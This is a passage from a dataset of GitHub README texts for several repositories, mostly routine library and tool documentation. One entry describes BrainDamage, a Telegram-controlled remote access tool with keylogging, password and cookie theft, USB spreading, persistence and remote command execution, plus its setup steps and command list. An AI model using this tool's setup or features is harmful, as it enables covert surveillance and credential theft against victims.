saved debugging CGI environment\nproduced by a pre-2.0 version of CGIC was made. \n<\/dl>\n<h3><a name=\"index\">cgic quick index<\/a><\/h3>\n<a href=\"#cgiAccept\">cgiAccept<\/a> |\n<a href=\"#cgiAuthType\">cgiAuthType<\/a> |\n<a href=\"#cgiContentLength\">cgiContentLength<\/a> |\n<a href=\"#cgiContentType\">cgiContentType<\/a> |\n<a href=\"#cgiEnvironmentIO\">cgiEnvironmentIO<\/a> |\n<a href=\"#cgiEnvironmentMemory\">cgiEnvironmentMemory<\/a> |\n<a href=\"#cgiEnvironmentSuccess\">cgiEnvironmentSuccess<\/a> |\n<a href=\"#cgiCookieInteger\">cgiCookieInteger<\/a> |\n<a href=\"#cgiCookies\">cgiCookies<\/a> |\n<a href=\"#cgiCookieSetInteger\">cgiCookieSetInteger<\/a> |\n<a href=\"#cgiCookieSetString\">cgiCookieSetString<\/a> |\n<a href=\"#cgiCookieString\">cgiCookieString<\/a> |\n<a href=\"#cgiHtmlEscape\">cgiHtmlEscape<\/a> |\n<a href=\"#cgiHtmlEscapeData\">cgiHtmlEscapeData<\/a> |\n<a href=\"#cgiValueEscape\">cgiValueEscape<\/a> |\n<a href=\"#cgiValueEscapeData\">cgiValueEscapeData<\/a> |\n<a href=\"#cgiFormBadType\">cgiFormBadType<\/a> |\n<a href=\"#cgiFormCheckboxMultiple\">cgiFormCheckboxMultiple()<\/a> |\n<a href=\"#cgiFormCheckboxSingle\">cgiFormCheckboxSingle()<\/a> |\n<a href=\"#cgiFormConstrained\">cgiFormConstrained<\/a> |\n<a href=\"#cgiFormDouble\">cgiFormDouble()<\/a> |\n<a href=\"#cgiFormDoubleBounded\">cgiFormDoubleBounded()<\/a> |\n<a href=\"#cgiFormEOF\">cgiFormEOF<\/a> |\n<a href=\"#cgiFormEmpty\">cgiFormEmpty<\/a> |\n<a href=\"#cgiFormEntries\">cgiFormEntries<\/a> |\n<a href=\"#cgiFormFileClose\">cgiFormFileClose<\/a> |\n<a href=\"#cgiFormFileContentType\">cgiFormFileContentType<\/a> |\n<a href=\"#cgiFormFileName\">cgiFormFileName<\/a> |\n<a href=\"#cgiFormFileOpen\">cgiFormFileOpen<\/a> |\n<a href=\"#cgiFormFileRead\">cgiFormFileRead<\/a> |\n<a href=\"#cgiFormFileSize\">cgiFormFileSize<\/a> |\n<a href=\"#cgiFormInteger\">cgiFormInteger()<\/a> |\n<a href=\"#cgiFormIntegerBounded\">cgiFormIntegerBounded()<\/a> |\n<a href=\"#cgiFormNoContentType>cgiFormNoContentType<\/a> |\n<a href=\"#cgiFormNoFileName>cgiFormNoFileName<\/a> |\n<a href=\"#cgiFormNoSuchChoice\">cgiFormNoSuchChoice<\/a> |\n<a href=\"#cgiFormNotAFile>cgiFormNotAFile<\/a> |\n<a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a> |\n<a href=\"#cgiFormRadio\">cgiFormRadio()<\/a> |\n<a href=\"#cgiFormSelectMultiple\">cgiFormSelectMultiple()<\/a> |\n<a href=\"#cgiFormSelectSingle\">cgiFormSelectSingle()<\/a> |\n<a href=\"#cgiFormString\">cgiFormString()<\/a> |\n<a href=\"#cgiFormStringMultiple\">cgiFormStringMultiple()<\/a> |\n<a href=\"#cgiFormStringNoNewlines\">cgiFormStringNoNewlines()<\/a> |\n<a href=\"#cgiFormStringSpaceNeeded\">cgiFormStringSpaceNeeded()<\/a> |\n<a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a> |\n<a href=\"#cgiFormTruncated\">cgiFormTruncated<\/a> |\n<a href=\"#cgiGatewayInterface\">cgiGatewayInterface<\/a> |\n<a href=\"#cgiHeaderContentType\">cgiHeaderContentType()<\/a> |\n<a href=\"#cgiHeaderLocation\">cgiHeaderLocation()<\/a> |\n<a href=\"#cgiHeaderStatus\">cgiHeaderStatus()<\/a> |\n<a href=\"#cgiIn\">cgiIn<\/a> |\n<a href=\"#cgiMain\">cgiMain()<\/a>\n<a href=\"#cgiOut\">cgiOut<\/a> |\n<a href=\"#cgiPathInfo\">cgiPathInfo<\/a> |\n<a href=\"#cgiPathTranslated\">cgiPathTranslated<\/a> |\n<a href=\"#cgiQueryString\">cgiQueryString<\/a> |\n<a href=\"#cgiReadEnvironment\">cgiReadEnvironment()<\/a> |\n<a href=\"#cgiReferrer\">cgiReferrer()<\/a> |\n<a href=\"#cgiRemoteAddr\">cgiRemoteAddr<\/a> |\n<a href=\"#cgiRemoteHost\">cgiRemoteHost<\/a> |\n<a href=\"#cgiRemoteIdent\">cgiRemoteIdent<\/a> |\n<a href=\"#cgiRemoteUser\">cgiRemoteUser<\/a> |\n<a href=\"#cgiRequestMethod\">cgiRequestMethod<\/a> |\n<a href=\"#cgiScriptName\">cgiScriptName<\/a> |\n<a href=\"#cgiServerName\">cgiServerName<\/a> |\n<a href=\"#cgiServerPort\">cgiServerPort<\/a> |\n<a href=\"#cgiServerProtocol\">cgiServerProtocol<\/a> |\n<a href=\"#cgiServerSoftware\">cgiServerSoftware<\/a> |\n<a href=\"#cgiStringArrayFree\">cgiStringArrayFree()<\/a> |\n<a href=\"#cgiUserAgent\">cgiUserAgent<\/a> |\n<a href=\"#cgiWriteEnvironment\">cgiWriteEnvironment()<\/a>\n"},{"repo":"\/mehulj94\/BrainDamage","language":"Python","readme_contents":"# BrainDamage\nA python based remote administration tool which uses [Telegram](https:\/\/telegram.org\/) as C&C server.\n\n<pre>\n                           \/\\\n                          \/_.\\\n                    _,.-'\/ `\",\\'-.,_\n                 -~^    \/______\\`~~-^~:\n\n  ____            _       _____                                   \n |  _ \\          (_)     |  __ \\                                  \n | |_) |_ __ __ _ _ _ __ | |  | | __ _ _ __ ___   __ _  __ _  ___ \n |  _ <| '__\/ _` | | '_ \\| |  | |\/ _` | '_ ` _ \\ \/ _` |\/ _` |\/ _ \\\n | |_) | | | (_| | | | | | |__| | (_| | | | | | | (_| | (_| |  __\/\n |____\/|_|  \\__,_|_|_| |_|_____\/ \\__,_|_| |_| |_|\\__,_|\\__, |\\___|\n                                                        __\/ |     \n                                                       |___\/      \n\n--> Coded by: Mehul Jain(mehulj94@gmail.com)\n--> Github: https:\/\/github.com\/mehulj94\n--> Twitter: https:\/\/twitter.com\/_b00geyman_\n--> For windows only\n\n  ______         _                       \n |  ____|       | |                      \n | |__ ___  __ _| |_ _   _ _ __ ___  ___ \n |  __\/ _ \\\/ _` | __| | | | '__\/ _ \\\/ __|\n | | |  __\/ (_| | |_| |_| | | |  __\/\\__ \\\n |_|  \\___|\\__,_|\\__|\\__,_|_|  \\___||___\/\n                                         \n\n--> Persistance\n--> USB spread\n--> Port Scanner\n--> Router Finder\n--> Run shell commands\n--> Keys logging\n--> Insert keystrokes\n--> Record audio\n--> Webserver\n--> Screenshot logging\n--> Download files in the host\n--> Execute shutdown, restart, logoff, lock\n--> Send drive tree structure\n--> Set email template\n--> Rename Files\n--> Change wallpaper\n--> Open website\n--> Send Password for\n    \u2022 Chrome\n    \u2022 Mozilla\n    \u2022 Filezilla\n    \u2022 Core FTP\n    \u2022 CyberDuck\n    \u2022 FTPNavigator\n    \u2022 WinSCP\n    \u2022 Outlook\n    \u2022 Putty\n    \u2022 Skype\n    \u2022 Generic Network\n--> Cookie stealer\n--> Send active windows\n--> Gather system information\n    \u2022 Drives list\n    \u2022 Internal and External IP\n    \u2022 Ipconfig \/all output\n    \u2022 Platform\n<\/pre>\n\n# Setup\n* Telegram setup:\n  * Install [Telegram](https:\/\/telegram.org\/) app and search for \"BOTFATHER\".\n  * Type \/help to see all possible commands.\n  * Click on or type \/newbot to create a new bot.\n  * Name your bot.\n  * You should see a new API token generated for it.\n* Dedicated Gmail account. Remember to check \"allow connection from less secure apps\" in gmail settings.\n* Set access_token in eclipse.py to token given by the botfather.\n* Set CHAT_ID in eclipse.py. Send a message from the app and use the telegram api to get this chat id.\n\n> bot.getMe() will give output {'first_name': 'Your Bot', 'username': 'YourBot', 'id': 123456789}\n\n* Set copied_startup_filename in Eclipse.py.\n* Set Gmail password and Username in \/Breathe\/SendData.py\n\n\n# Abilities\n* whoisonline- list active slaves\n> This command will list all the active slaves.\n\n* destroy- delete&clean up\n> This command will remove the stub from host and will remove registry entries.\n\n* cmd- execute command on CMD\n> Run shell commands on host\n\n* download- url (startup, desktop, default)\n> This will download files in the host computer.\n\n* execute- shutdown, restart, logoff, lock\n> Execute the following commands\n\n* screenshot- take screenshot\n> Take screenshot of the host of computer.\n\n* send- passwords, drivetree, driveslist, keystrokes, openwindows\n> This command will sends passwords (saved browser passwords, FTP, Putty..), directory tree of host (upto level 2), logged keystrokes and windows which are currently open\n\n* set- email (0:Default,1:URL,2:Update), filename (0: Itself, 1: Others), keystrokes (text)\n> This command can set email template (default, download from url, update current template with text you'll send), rename filenames or insert keystrokes in host.\n\n* start- website (URL), keylogger, recaudio (time), webserver (Port), spread\n> This command can open website, start keylogger, record audio, start webserver, USB Spreading\n\n* stop- keylogger, webserver\n> This command will stop keylogger or webserver\n\n* wallpaper- change wallpaper (URL)\n> Changes wallpaper of host computer\n\n* find- openports (host, threads, ports), router\n> This command will find open ports and the router the host is using\n\n* help- print this usage\n\n# Requirements\n* [Telepot](https:\/\/github.com\/nickoala\/telepot)\n* [PyAudio](https:\/\/people.csail.mit.edu\/hubert\/pyaudio\/)\n* [PyCrypto](http:\/\/www.voidspace.org.uk\/python\/modules.shtml#pycrypto)\n* [Pyasn1](https:\/\/pypi.python.org\/pypi\/pyasn1)\n* [Pillow](https:\/\/pillow.readthedocs.io\/en\/latest\/installation.html)\n* Install [PyHook](https:\/\/sourceforge.net\/projects\/pyhook\/)\n* Install [PyWin32](https:\/\/sourceforge.net\/projects\/pywin32\/)\n* Install [Microsoft Visual C++ Compiler for Python](https:\/\/www.microsoft.com\/en-us\/download\/details.aspx?id=44266)\n* Install [PyInstaller](http:\/\/www.pyinstaller.org\/)\n\n# Screenshots\n\n![Setup](https:\/\/image.ibb.co\/mkWNRF\/Capture.png)\n\n![Notification](https:\/\/image.ibb.co\/kCey0a\/IMG_0009.jpg)\n\n![Who is Online Telegram](https:\/\/image.ibb.co\/f20GmF\/IMG_0006.jpg)\n\n![Help Telegram](https:\/\/image.ibb.co\/bZHJ0a\/IMG_0004.jpg)\n\n![Record Audio Telegram](https:\/\/image.ibb.co\/dA3fDv\/IMG_0005.jpg)\n\n![Take screenshot Telegram](https:\/\/image.ibb.co\/buPntv\/IMG_0007.jpg)\n\n# For educational purposes only, use at your own responsibility.\n\n"},{"repo":"\/cplusplus\/fundamentals-ts","language":"HTML","readme_contents":"fundamentals-ts\n===============\n\nThe draft C++ Library Fundamentals Technical Specification.\n\nThe draft can be viewed online at: https:\/\/cplusplus.github.io\/fundamentals-ts\/\n\nThis TS is written using a set of [custom HTML elements](https:\/\/github.com\/cplusplus\/html-doc-framework)\nbased on the [Polymer framework](http:\/\/www.polymer-project.org\/).\n\n\nStyle guide\n-----------\n\nThis guide is intended to produce results compatible with the main C++\nstandard, which is written in LaTeX.\n\nLook for applicable [`<cxx-*>` elements](https:\/\/github.com\/cplusplus\/html-doc-framework),\nand write semantic markup according to http:\/\/developers.whatwg.org\/.\n\nGenerally use `<code>` rather than `<samp>`, `<kbd>`, `<tt>` or other\nmonospacing elements. `<samp>` could be useful for sample compiler\nerror messages.  Don't use `<kbd>` for code a user might enter: that's\njust `<code>`.\n\nUse `<em>` for emphasis and `<i>` for text in another \"voice\", like\ncomments and technical terms.  `<dfn>` is good for the defining\ninstance of a term, but not for subsequent uses. I may add a\n`<cxx-term>` element to call out uses of technical terms specifically,\nwhich will enable automatic cross-linking and indexing.\n\nUse `<var>` for variables. There's tension between using it for all\nvariables, including function parameters, and only calling out\nmeta-variables used in documentation.  I'm leaning toward only\nmeta-variables, since marking up parameters requires a huge number of\ntags, which make it harder to read the source, and there's not much\nreason to italicize normal variables.  Most meta-variables will end up\nmarked up as `<code><var>meta-variable<\/var><\/code>`.\n\nVery little text is bold, either with `<strong>` or `<b>`.\n\nAny repeated markup structure should be abstracted out into a custom\nelement in the https:\/\/github.com\/cplusplus\/html-doc-framework project.\n\n\nNamespace formatting\n--------------------\n\nNamespace contents are indented by 2 spaces, with one blank line\nbetween the namespace open and the first line of the contents.\nMultiple namespaces can be opened at the same indentation level, like:\n\n```c++\nnamespace std {\nnamespace experimental {\n\n  class contents{};\n\n} \/\/ namespace experimental\n} \/\/ namespace std\n```\n\nNamespaces are only shown in header synopses, not around class or\nfunction definitions.\n"},{"repo":"\/Project-OSRM\/osrm-backend","language":"C++","readme_contents":"## Open Source Routing Machine\n\n| Linux \/ macOS | Windows | Code Coverage |\n| ------------- | ------- | ------------- |\n| [![Travis](https:\/\/travis-ci.org\/Project-OSRM\/osrm-backend.png?branch=master)](https:\/\/travis-ci.org\/Project-OSRM\/osrm-backend) | [![AppVeyor](https:\/\/ci.appveyor.com\/api\/projects\/status\/4iuo3s9gxprmcjjh)](https:\/\/ci.appveyor.com\/project\/DennisOSRM\/osrm-backend) | [![Codecov](https:\/\/codecov.io\/gh\/Project-OSRM\/osrm-backend\/branch\/master\/graph\/badge.svg)](https:\/\/codecov.io\/gh\/Project-OSRM\/osrm-backend) |\n\nHigh performance routing engine written in C++14 designed to run on OpenStreetMap data.\n\nThe following services are available via HTTP API, C++ library interface and NodeJs wrapper:\n- Nearest - Snaps coordinates to the street network and returns the nearest matches\n- Route - Finds the fastest route between coordinates\n- Table - Computes the duration or distances of the fastest route between all pairs of supplied coordinates\n- Match - Snaps noisy GPS traces to the road network in the most plausible way\n- Trip - Solves the Traveling Salesman Problem using a greedy heuristic\n- Tile - Generates Mapbox Vector Tiles with internal routing metadata\n\nTo quickly try OSRM use our [demo server](http:\/\/map.project-osrm.org) which comes with both the backend and a frontend on top.\n\nFor a quick introduction about how the road network is represented in OpenStreetMap and how to map specific road network features have a look at [this guide about mapping for navigation](https:\/\/www.mapbox.com\/mapping\/mapping-for-navigation\/).\n\nRelated [Project-OSRM](https:\/\/github.com\/Project-OSRM) repositories:\n- [osrm-frontend](https:\/\/github.com\/Project-OSRM\/osrm-frontend) - User-facing frontend with map. The demo server runs this on top of the backend\n- [osrm-text-instructions](https:\/\/github.com\/Project-OSRM\/osrm-text-instructions) - Text instructions from OSRM route response\n- [osrm-backend-docker](https:\/\/hub.docker.com\/r\/osrm\/osrm-backend\/) - Ready to use Docker images\n\n## Documentation\n\n### Full documentation\n\n- [Hosted documentation](http:\/\/project-osrm.org)\n- [osrm-routed HTTP API documentation](docs\/http.md)\n- [libosrm API documentation](docs\/libosrm.md)\n\n## Contact\n\n- IRC: `irc.oftc.net`, channel: `#osrm` ([Webchat](https:\/\/webchat.oftc.net))\n- Mailinglist: `https:\/\/lists.openstreetmap.org\/listinfo\/osrm-talk`\n\n## Quick Start\n\nThe easiest and quickest way to setup your own routing engine is to use Docker images we provide.\n\nThere are two pre-processing pipelines available:\n- Contraction Hierarchies (CH)\n- Multi-Level Dijkstra (MLD)\n\nwe recommend using MLD by default except for special use-cases such as very large distance matrices where CH is still a better fit for the time being.\nIn the following we explain the MLD pipeline.\nIf you want to use the CH pipeline instead replace `osrm-partition` and `osrm-customize` with a single `osrm-contract` and change the algorithm option for `osrm-routed` to `--algorithm ch`.\n\n### Using Docker\n\nWe base our Docker images ([backend](https:\/\/hub.docker.com\/r\/osrm\/osrm-backend\/), [frontend](https:\/\/hub.docker.com\/r\/osrm\/osrm-frontend\/)) on Debian and make sure they are as lightweight as possible.\n\nDownload OpenStreetMap extracts for example from [Geofabrik](http:\/\/download.geofabrik.de\/)\n\n    wget http:\/\/download.geofabrik.de\/europe\/germany\/berlin-latest.osm.pbf\n\nPre-process the extract with the car profile and start a routing engine HTTP server on port 5000\n\n    docker run -t -v \"${PWD}:\/data\" osrm\/osrm-backend osrm-extract -p \/opt\/car.lua \/data\/berlin-latest.osm.pbf\n\nThe flag `-v \"${PWD}:\/data\"` creates the directory `\/data` inside the docker container and makes the current working directory `\"${PWD}\"` available there. The file `\/data\/berlin-latest.osm.pbf` inside the container is referring to `\"${PWD}\/berlin-latest.osm.pbf\"` on the host.\n\n    docker run -t -v \"${PWD}:\/data\" osrm\/osrm-backend osrm-partition \/data\/berlin-latest.osrm\n    docker run -t -v \"${PWD}:\/data\" osrm\/osrm-backend osrm-customize \/data\/berlin-latest.osrm\n\nNote that `berlin-latest.osrm` has a different file extension. \n\n    docker run -t -i -p 5000:5000 -v \"${PWD}:\/data\" osrm\/osrm-backend osrm-routed --algorithm mld \/data\/berlin-latest.osrm\n\nMake requests against the HTTP server\n\n    curl \"http:\/\/127.0.0.1:5000\/route\/v1\/driving\/13.388860,52.517037;13.385983,52.496891?steps=true\"\n\nOptionally start a user-friendly frontend on port 9966, and open it up in your browser\n\n    docker run -p 9966:9966 osrm\/osrm-frontend\n    xdg-open 'http:\/\/127.0.0.1:9966'\n\nIn case Docker complains about not being able to connect to the Docker daemon make sure you are in the `docker` group.\n\n    sudo usermod -aG docker $USER\n\nAfter adding yourself to the `docker` group make sure to log out and back in again with your terminal.\n\nWe support the following images on Docker Cloud:\n\nName | Description\n-----|------\n`latest` | `master` compiled with release flag\n`latest-assertions` | `master` compiled with with release flag, assertions enabled and debug symbols\n`latest-debug` | `master` compiled with debug flag\n`<tag>` | specific tag compiled with release flag\n`<tag>-debug` | specific tag compiled with debug flag\n\n### Building from Source\n\nThe following targets Ubuntu 16.04.\nFor instructions how to build on different distributions, macOS or Windows see our [Wiki](https:\/\/github.com\/Project-OSRM\/osrm-backend\/wiki).\n\nInstall dependencies\n\n```bash\nsudo apt install build-essential git cmake pkg-config \\\nlibbz2-dev libxml2-dev libzip-dev libboost-all-dev \\\nlua5.2 liblua5.2-dev libtbb-dev\n```\n\nCompile and install OSRM binaries\n\n```bash\nmkdir -p build\ncd build\ncmake ..\ncmake --build .\nsudo cmake --build . --target install\n```\n\n### Request Against the Demo Server\n\nRead the [API usage policy](https:\/\/github.com\/Project-OSRM\/osrm-backend\/wiki\/Demo-server).\n\nSimple query with instructions and alternatives on Berlin:\n\n```\ncurl \"https:\/\/router.project-osrm.org\/route\/v1\/driving\/13.388860,52.517037;13.385983,52.496891?steps=true&alternatives=true\"\n```\n\n### Using the Node.js Bindings\n\nThe Node.js bindings provide read-only access to the routing engine.\nWe provide API documentation and examples [here](docs\/nodejs\/api.md).\n\nYou will need a modern `libstdc++` toolchain (`>= GLIBCXX_3.4.20`) for binary compatibility if you want to use the pre-built binaries.\nFor older Ubuntu systems you can upgrade your standard library for example with:\n\n```\nsudo add-apt-repository ppa:ubuntu-toolchain-r\/test\nsudo apt-get update -y\nsudo apt-get install -y libstdc++-5-dev\n```\n\nYou can install the Node.js bindings via `npm install osrm` or from this repository either via\n\n    npm install\n\nwhich will check and use pre-built binaries if they're available for this release and your Node version, or via\n\n    npm install --build-from-source\n\nto always force building the Node.js bindings from source.\n\nFor usage details have a look [these API docs](docs\/nodejs\/api.md). \n\nAn exemplary implementation by a 3rd party with Docker and Node.js can be found [here](https:\/\/github.com\/door2door-io\/osrm-express-server-demo).\n\n\n## References in publications\n\nWhen using the code in a (scientific) publication, please cite\n\n```\n@inproceedings{luxen-vetter-2011,\n author = {Luxen, Dennis and Vetter, Christian},\n title = {Real-time routing with OpenStreetMap data},\n booktitle = {Proceedings of the 19th ACM SIGSPATIAL International Conference on Advances in Geographic Information Systems},\n series = {GIS '11},\n year = {2011},\n isbn = {978-1-4503-1031-4},\n location = {Chicago, Illinois},\n pages = {513--516},\n numpages = {4},\n url = {http:\/\/doi.acm.org\/10.1145\/2093973.2094062},\n doi = {10.1145\/2093973.2094062},\n acmid = {2094062},\n publisher = {ACM},\n address = {New York, NY, USA},\n}\n```\n"},{"repo":"\/chriskohlhoff\/asio","language":"C++","readme_contents":"error: no README"},{"repo":"\/zaphoyd\/websocketpp","language":"C++","readme_contents":"WebSocket++ (0.8.1)\n==========================\n\nWebSocket++ is a header only C++ library that implements RFC6455 The WebSocket\nProtocol. It allows integrating WebSocket client and server functionality into\nC++ programs. It uses interchangeable network transport modules including one\nbased on raw char buffers, one based on C++ iostreams, and one based on Asio \n(either via Boost or standalone). End users can write additional transport\npolicies to support other networking or event libraries as needed.\n\nMajor Features\n==============\n* Full support for RFC6455\n* Partial support for Hixie 76 \/ Hybi 00, 07-17 draft specs (server only)\n* Message\/event based interface\n* Supports secure WebSockets (TLS), IPv6, and explicit proxies.\n* Flexible dependency management (C++11 Standard Library or Boost)\n* Interchangeable network transport modules (raw, iostream, Asio, or custom)\n* Portable\/cross platform (Posix\/Windows, 32\/64bit, Intel\/ARM\/PPC)\n* Thread-safe\n\nGet Involved\n============\n\n[![Build Status](https:\/\/travis-ci.org\/zaphoyd\/websocketpp.png)](https:\/\/travis-ci.org\/zaphoyd\/websocketpp)\n\n**Project Website**\nhttp:\/\/www.zaphoyd.com\/websocketpp\/\n\n**User Manual**\nhttp:\/\/docs.websocketpp.org\/\n\n**GitHub Repository**\nhttps:\/\/github.com\/zaphoyd\/websocketpp\/\n\nGitHub pull requests should be submitted to the `develop` branch.\n\n**Announcements Mailing List**\nhttp:\/\/groups.google.com\/group\/websocketpp-announcements\/\n\n**IRC Channel**\n #websocketpp (freenode)\n\n**Discussion \/ Development \/ Support Mailing List \/ Forum**\nhttp:\/\/groups.google.com\/group\/websocketpp\/\n\nAuthor\n======\nPeter Thorson - websocketpp@zaphoyd.com\n"},{"repo":"\/FooBarWidget\/boyer-moore-horspool","language":"HTML","readme_contents":"Introduction\n============\nThis repository contains various C++ implementations of the Boyer-Moore string search algorithm and derivative algorithms. These family of algorithms allow fast searching of substrings, much faster than `strstr()` and `memmem()`. The longer the substring, the faster the algorithms work. The implementations are written to be both efficient and minimalist so that you can easily incorporate them in your own code.\n\nThis blog post has more information: http:\/\/blog.phusion.nl\/2010\/12\/06\/efficient-substring-searching\/\n\n\nFiles\n-----\n\n### Horspool.cpp\nImplements Boyer-Moore-Horspool.\nHorspoolTest.cpp is the unit test file.\n\n### BoyerMooreAndTurbo.cpp\nImplements Boyer-Moore and Turbo Boyer-Moore. No special test files, but they're used in the benchmark program which serves as a basic sanity test.\n\n### StreamBoyerMooreHorspool.h\nA special Boyer-Moore-Horspool implementation that supports \"streaming\" input. Instead of supplying the entire haystack at once, you can supply the haystack piece-by-piece. This makes it especially suitable for parsing data that you may receive over the network. This implementation also contains various memory and CPU optimizations, allowing it to be slightly faster and to use less memory than Horspool.cpp. See the file for detailed documentation.\n\nUnit tests are in StreamTest.cpp.\n\n### benchmark.cpp\nBenchmark program. Used in combination with the `run_benchmark` Rake task.\n\n### TestMain.cpp\nUnit test runner program.\n\n\nTesting and benchmarking\n------------------------\n\nYou need Ruby and Rake. To compile the unit tests:\n\n    rake test\n    .\/test\n\nTo run the benchmarks:\n\n    rake run_benchmark\n\n\nWhich algorithm to use?\n-----------------------\nI've found that, on average, Boyer-Moore-Horspool performs best thanks to its\nsimple inner loop which can be heavily optimized. It has pretty bad worst-case\nperformance but the worst case (or even bad cases) almost never occur in practice.\n"},{"repo":"\/pytries\/marisa-trie","language":"Python","readme_contents":"marisa-trie |pyversions| |travis| |appveyor|\n============================================\n\n.. |pyversions| image:: https:\/\/img.shields.io\/pypi\/pyversions\/marisa-trie.svg\n   :target: https:\/\/pypi.python.org\/pypi\/marisa-trie\n\n.. |travis| image:: https:\/\/travis-ci.org\/pytries\/marisa-trie.svg\n   :target: https:\/\/travis-ci.org\/pytries\/marisa-trie\n\n.. |appveyor| image:: https:\/\/ci.appveyor.com\/api\/projects\/status\/p887ad4jbdg6u7yo?svg=true\n   :target: https:\/\/ci.appveyor.com\/project\/superbobry\/marisa-trie-75wx1\n\nStatic memory-efficient Trie-like structures for Python (2.7 and 3.4+)\nbased on `marisa-trie`_ C++ library.\n\nString data in a MARISA-trie may take up to 50x-100x less memory than\nin a standard Python dict; the raw lookup speed is comparable; trie also\nprovides fast advanced methods like prefix search.\n\n.. note::\n\n    There are official SWIG-based Python bindings included\n    in C++ library distribution; this package provides alternative\n    Cython-based pip-installable Python bindings.\n\n.. _marisa-trie: https:\/\/github.com\/s-yata\/marisa-trie\n\nInstallation\n============\n\n::\n\n    pip install marisa-trie\n\nUsage\n=====\n\nSee :ref:`Tutorial <tutorial>` and :ref:`API <api>` for details.\n\nCurrent limitations\n===================\n\n* The library is not tested with mingw32 compiler;\n* ``.prefixes()`` method of ``BytesTrie`` and ``RecordTrie`` is quite slow\n  and doesn't have iterator counterpart;\n* ``read()`` and ``write()`` methods don't work with file-like objects\n  (they work only with real files; pickling works fine for file-like objects);\n* there are ``keys()`` and ``items()`` methods but no ``values()`` method.\n\nLicense\n=======\n\nWrapper code is licensed under MIT License.\n\nBundled `marisa-trie`_ C++ library is dual-licensed under\nLGPL and BSD 2-clause license.\n"},{"repo":"\/xtaci\/algorithms","language":"C++","readme_contents":"### Algorithms & Data Structures in C++\n\n[![Build Status][1]][2]\n\n[1]: https:\/\/travis-ci.org\/xtaci\/algorithms.svg?branch=master\n[2]: https:\/\/travis-ci.org\/xtaci\/algorithms\n\n#### \u76ee\u6807 ( goal ) :\n\n   1. \u7ecf\u5178\u7684\u7b97\u6cd5\u5b9e\u73b0      \n      (classical algorithms implementations)      \n   2. \u670d\u52a1\u5668\u7aef       \n      (based on linux\/gcc)       \n   3. \u6b63\u786e\uff0c\u6613\u4e8e\u4f7f\u7528\u548c\u6539\u9020, \u4e00\u4e2a\u5934\u6587\u4ef6\u4e00\u4e2a\u7b97\u6cd5\uff0c\u5e76\u9644\u5e26\u4e00\u4e2ademo.       \n      (correct! and ease of use, one .header file per algorithm)        \n\n#### \u7ea6\u5b9a ( Convention ):\n\n   1.  \u4e00\u4e2a\u7b97\u6cd5\u7528\u4e00\u4e2a.h\u6587\u4ef6\u8868\u793a\u653e\u5230include\u4e0b. ( one .header file per algorithm. )\n   2.  \u7b97\u6cd5\u6f14\u793a\u7684demo\u7a0b\u5e8f\u653e\u5230src\u4e0b.  ( one demo per algorithm.  )\n   3.  \u7a0b\u5e8f\u6b63\u786e\u901a\u8fc7\u540e\uff0c\u8bf7\u53d1\u8d77Pull Requests\uff0c\u4ee3\u7801\u88ab\u9a8c\u8bc1\u540e\u5165\u5e93\uff0c\u5e76\u5728README\u4e2d\u53d1\u5e03\u65b0\u7b97\u6cd5\u5b9e\u73b0\u3002\n       (Please Use Fork+Pull Requests !!! Correctness is the most important!)\n   4.  TAB = 4 space.  set ts=4 in vim\n   5.  Graph\u7684\u8f93\u51fa\u683c\u5f0f\u4e3a [Graphviz](http:\/\/www.graphviz.org\/) Dot\u683c\u5f0f.\n   \t(the output format of the graph is in dot of graphviz.)\n   \teg:\n   \t![demograph](demo_graph.png)\n\n#### \u5df2\u5b9e\u73b0 ( Implemented ):\n\n| Name | File |\n|------|------|\n|Array shuffle|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/shuffle.h |\n|Prime test(trial division)|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/prime.h|\n|Prime test(Miller-Rabin's method)|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/prime.h|\n|2D Array|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/2darray.h|\n|Arbitrary Integer|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/integer.h|\n|Linear congruential generator|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/random.h|\n|Maximum subarray problem|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/max_subarray.h|\n|Bit-Set|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/bitset.h|\n|Queue|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/queue.h|\n|Stack|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/stack.h|\n|Binary Heap|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/heap.h|\n|Fibonacci Heap|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/fib-heap.h|\n|Priority Queue (list based)|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/priority_queue.h|\n|Bubble sort|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/bubble_sort.h|\n|Selection sort|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/selection_sort.h|\n|Insertion sort|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/insertion_sort.h|\n|Shell sort|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/shell_sort.h|\n|Radix sort|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/radix_sort.h|\n|Quicksort|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/quick_sort.h|\n|Merge sort|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/merge_sort.h|\n|Double linked list|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/double_linked_list.h|\n|Skip list|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/skiplist.h|\n|Largest common sequence|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/lcs.h|\n|Binary search tree|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/binary_search_tree.h|\n|AVL tree|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/avl.h|\n|Dynamic order statistics|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/dos_tree.h|\n|Red-black tree|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/rbtree.h|\n|Interval tree|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/interval_tree.h|\n|Prefix Tree(Trie)|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/trie.h|\n|Suffix 